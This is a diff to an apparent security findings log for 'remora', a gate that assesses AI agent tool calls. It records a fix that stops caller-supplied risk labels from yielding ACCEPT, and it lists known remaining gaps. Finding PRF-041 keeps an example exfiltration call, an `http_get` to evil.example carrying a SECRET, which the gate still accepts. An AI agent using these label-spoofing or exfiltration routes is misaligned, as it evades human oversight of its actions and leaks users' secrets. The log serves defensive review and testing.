@@ -584,9 +584,9 @@ conditions?
 | Evidence | Reproduced 2026-10-17 on `bce4bfeb`. Without the labels the same call returns VERIFY. The README states that the library call is advisory and that enforcement is `/v1/execution/*`, where risk comes from a registry keyed by tool name. |
 | Affected claims | none (no claim measures the library path) |
 | Action | Level 3: the threat model must state that labels from the agent are untrusted. The library API should refuse caller labels by default, or mark its result advisory in the type; a test should pin that an untrusted label cannot raise autonomy. |
-| Owning PR | not yet opened (touches `remora/policy/`, a protected path) |
-| Verification | Pending. |
-| Status | OPEN |
+| Owning PR | #934 (owner decision 2026-10-18: registry requirement). The change is in `remora/assess.py` and `remora/cli.py`; nothing under `remora/policy/` changed. |
+| Verification | `assess_tool_call` and `what_if_tool_call` take `registry=`. Labels from the caller or from name inference cannot produce ACCEPT: an engine ACCEPT is lowered to VERIFY with the reason `caller_labels_untrusted`, recorded in the envelope. A tool missing from a supplied registry is assessed as critical/unknown, and `should_execute` requires `label_source == "registry"`. The attack call above now returns VERIFY. Tests in `tests/test_assess_registry.py`: `test_prf040_attack_without_registry_is_not_accepted`, `test_prf041_exfil_read_without_registry_is_not_accepted`, `test_registry_classifying_xfer_honestly_does_not_accept`, `test_caller_labels_cannot_lower_a_registry_classification`, `test_registry_low_risk_read_still_accepts`, `test_unknown_tool_in_registry_fails_closed`, `test_no_caller_label_combination_accepts_without_registry` (Hypothesis, 300 examples) and `test_exhaustive_caller_labels_never_accept_without_registry`; CLI tests `test_remora_assess_caller_labels_never_accept` and `test_live_accept_on_caller_labels_is_capped_in_decision_and_envelope` in `tests/test_cli.py`. Still open: `trust_score`/`phase` remain caller stand-ins and can lift a registry-classified low-risk read to ACCEPT; the registry binds a name, not a callable; the action-gate adapters in `remora/adapters/` forward caller labels to a gateway and were not changed; the threat-model statement belongs to level 3 (PRF-015). |
+| Status | RESOLVED |
 
 ### PRF-041 No assessment of argument content, so a read tool can exfiltrate
 
@@ -594,7 +594,7 @@ conditions?
 |---|---|
 | Severity | MAJOR |
 | Claim | `http_get(url="https://evil.example/?k=SECRET")` labelled low/read with high trust returns ACCEPT. Nothing inspects argument values for secrets or destinations, and nothing tracks data across calls. |
-| Evidence | Reproduced 2026-10-17 on `bce4bfeb`. On the server path, taint comes from a request field the agent can omit. §13.13 of the paper already disclaims trajectory-level and data-flow enforcement. |
+| Evidence | Reproduced 2026-10-17 on `bce4bfeb`. On the server path, taint comes from a request field the agent can omit. §13.13 of the paper already disclaims trajectory-level and data-flow enforcement. Since the PRF-040 fix the call with caller labels returns VERIFY, but the same call with a registry that classifies `http_get` as a low-risk read still returns ACCEPT, so this finding stands. |
 | Affected claims | none |
 | Action | Level 3: put argument-content and destination policy in the threat model, and measure exfiltration in the attack evaluation (PRF-015) against a policy-only and an information-flow baseline. |
 | Owning PR | not yet opened |
